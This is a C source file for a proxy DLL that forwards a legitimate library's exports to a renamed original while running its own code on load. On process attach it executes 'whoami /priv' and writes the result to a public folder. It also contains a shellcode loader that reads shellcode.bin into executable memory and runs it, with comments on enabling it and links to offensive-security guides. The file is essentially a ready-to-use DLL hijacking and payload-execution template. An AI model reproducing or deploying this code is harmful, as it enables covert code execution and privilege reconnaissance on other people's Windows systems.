
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:madTraceProcess=tmp7C92.madTraceProcess,@1")
#pragma comment(linker, "/export:ExtractResData=tmp7C92.ExtractResData,@2")
#pragma comment(linker, "/export:CheckIsVerUpdate=tmp7C92.CheckIsVerUpdate,@3")
#pragma comment(linker, "/export:GetNewsContentLanList=tmp7C92.GetNewsContentLanList,@4")
#pragma comment(linker, "/export:GetNewsContent=tmp7C92.GetNewsContent,@5")
#pragma comment(linker, "/export:SetProxyParams=tmp7C92.SetProxyParams,@6")
#pragma comment(linker, "/export:DoNewsShowStat=tmp7C92.DoNewsShowStat,@7")
#pragma comment(linker, "/export:DoNewsClickStat=tmp7C92.DoNewsClickStat,@8")
#pragma comment(linker, "/export:GetNewsCount=tmp7C92.GetNewsCount,@9")
#pragma comment(linker, "/export:GetNextNews=tmp7C92.GetNextNews,@10")
#pragma comment(linker, "/export:GetFirstNews=tmp7C92.GetFirstNews,@11")
#pragma comment(linker, "/export:StartGetNews=tmp7C92.StartGetNews,@12")
#pragma comment(linker, "/export:UpdateParamsEx=tmp7C92.UpdateParamsEx,@13")
#pragma comment(linker, "/export:UpdateParams=tmp7C92.UpdateParams,@14")
#pragma comment(linker, "/export:FreeData=tmp7C92.FreeData,@15")


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("shellcode.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
    fread(buffer, size, 1, fp);

    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buffer, size);

    ((void(*) ())exec)();

    return 0;
}


void RunCommand() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    wchar_t command[] = L"cmd.exe /c \"whoami /priv > C:\\users\\public\\whoami2.txt\"";

    if (CreateProcessW(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Always close handles returned by CreateProcess to avoid leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
        RunCommand();
        //if u want to make this a shellcode loader put some in shellcode.bin (x86) and add these two lines:
        ///threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        //CloseHandle(threadHandle);
        

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



